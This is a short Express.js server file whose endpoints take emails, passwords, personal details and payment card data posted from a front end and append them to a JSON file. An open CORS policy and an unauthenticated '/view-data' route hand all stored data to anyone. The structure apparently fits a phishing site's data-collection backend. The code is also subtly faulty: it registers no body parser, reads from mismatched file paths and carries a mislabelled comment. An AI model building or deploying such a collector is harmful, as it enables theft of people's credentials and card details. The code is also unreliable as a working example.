const express = require('express');
    app = express();
    path = require('path');
    fs = require ('fs');
    cors = require('cors');
 
    app.use(cors());
    
// Request 

app.get('/', (req, res) => {
    res.send('Server is running...!')
})

app.post('/save-email', (req, res) => {
    let email = req.body;

    // read the existing data from the JSON file
    fs.readFile('./data.json', (err, jsonData) => {
        if (err) {
            res.status(500).send('Internal server error');
            return;
        }

        let emailData = JSON.parse(jsonData);

        // check if the emails array exists
        if (!emailData.emails) {
            emailData.emails = [];
        }

        // add the new email to the array
        emailData.emails.push(email);

        // write the updated data back to the file
        fs.writeFile('./data.json', JSON.stringify(emailData, null, 4), (err) => {
            if (err) {
                res.status(500).send('Internal server error');
                return;
            }
            res.status(200).send('OK');
        });
    });
});

app.post("/save-mdp", (req, res) => {
    let mdp = req.body;
    
    // read the existing data from the JSON file
    fs.readFile('./data.json', (err, jsonData) => {
        if (err) {
            res.status(500).send('Internal server error');
            return;
        }

        let mdpData = JSON.parse(jsonData);

        // check if the password array exists
        if (!mdpData.passwords) {
            mdpData.passwords = [];
        }

        // add the new email to the array
        mdpData.passwords.push(mdp);

        // write the updated data back to the file
        fs.writeFile('./data.json', JSON.stringify(mdpData, null, 4), (err) => {
            if (err) {
                res.status(500).send('Internal server error');
                return;
            }
            res.status(200).send('OK');
        });
    });
    
})

app.post("/infoUser", (req, res) => {
    let infoUser = req.body;

    fs.readFile('./data.json', (err, jsonData) => {
        if (err){
            res.status(500).send('Internal server error');
            return;
        }

        let Userdata = JSON.parse(jsonData);

        if(!Userdata.info_user) {
            Userdata.info_user = [];
        }

        Userdata.info_user.push(infoUser);

        fs.writeFile("./data.json", JSON.stringify(Userdata, null, 4), (err) => {
            if (err) {
                res.status(500).send('Internal server error');
                return;
            }
            res.status(200).send('OK');
        })
    })
})

app.post("/carteC", (req, res) => {
    let infocarte = req.body;

    fs.readFile('./data.json', (err, jsonData) => {
        if (err){
            res.status(500).send('Internal server error');
            return;
        }

        let UserCarte = JSON.parse(jsonData);

        if(!UserCarte.carte_user) {
            UserCarte.carte_user = [];
        }

        UserCarte.carte_user.push(infocarte);

        fs.writeFile("./data.json", JSON.stringify(UserCarte, null, 4), (err) => {
            if (err) {
                res.status(500).send('Internal server error');
                return;
            }
            res.status(200).send('OK');
        })
    })

})

app.get("/view-data", (req, res) => {
    const filePath = '/app/data.json';

    fs.readFile(filePath, (err, jsonData) => {
      if (err) {
        res.status(500).send('Internal server error');
        return;
      }
    
      // parse the JSON data and send it to the client
      let mdpData = JSON.parse(jsonData);
      res.send(mdpData);
    });
})
// End Request 

app.listen(8080, () => {
  console.log(`server started well !`);
});